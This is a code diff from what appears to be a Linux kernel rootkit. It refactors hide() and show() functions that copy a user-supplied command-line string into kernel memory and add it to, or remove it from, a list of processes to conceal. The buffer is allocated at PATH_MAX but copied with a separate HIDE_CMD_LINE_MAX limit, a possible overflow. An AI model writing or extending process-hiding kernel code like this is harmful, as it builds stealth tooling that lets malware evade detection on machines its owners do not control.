@@ -16,26 +16,26 @@ static int addProcessToHide(char* processName);
 static int deleteProcessToHide(char* processName);
 
 /* hide a directory entry */
-int hide(const char __user *path) {
-  char *_path;
+int hide(const char __user *cmd) {
+  char *_cmd;
   int retval;
   
-  if (path == NULL)
+  if (cmd == NULL)
     return -EFAULT;
-  _path = kcalloc(1, PATH_MAX, GFP_KERNEL);
+  _cmd = kcalloc(1, PATH_MAX, GFP_KERNEL);
   
-  if (IS_ERR_OR_NULL(_path))
+  if (IS_ERR_OR_NULL(_cmd))
     return -ENOMEM;
-  retval = strncpy_from_user(_path, path, PATH_MAX);
+  retval = strncpy_from_user(_cmd, cmd, HIDE_CMD_LINE_MAX);
   
   if (retval < 0) {
-    kfree(_path);
+    kfree(_cmd);
     return retval;
   }
-  retval = addProcessToHide(_path);
+  retval = addProcessToHide(_cmd);
   
   if(retval == -ENOMEM) {
-    kfree(_path);
+    kfree(_cmd);
     return -ENOMEM;
   }
   return 0;
@@ -129,29 +129,25 @@ int hide_init(struct sctm *sctm) {
 }
 
 /* show a directory entry */
-int show(const char __user *path) {
-  char *_path;
+int show(const char __user *cmd) {
+  char *_cmd;
   int retval;
   
-  if (path == NULL)
+  if (cmd == NULL)
     return -EFAULT;
-  _path = kcalloc(1, PATH_MAX, GFP_KERNEL);
+  _cmd = kcalloc(1, PATH_MAX, GFP_KERNEL);
   
-  if (IS_ERR_OR_NULL(_path))
+  if (IS_ERR_OR_NULL(_cmd))
     return -ENOMEM;
-  retval = strncpy_from_user(_path, path, PATH_MAX);
+  retval = strncpy_from_user(_cmd, cmd, HIDE_CMD_LINE_MAX);
   
   if (retval < 0) {
-    kfree(_path);
+    kfree(_cmd);
     return retval;
   }
-  retval = deleteProcessToHide(_path);
-  
-  if(retval == -ENOMEM) {
-    kfree(_path);
-    return -ENOMEM;
-  }
-  return 0;
+  retval = deleteProcessToHide(_cmd);
+  kfree(_cmd);
+  return retval;
 }
 
 //Add the process name to the arraylist
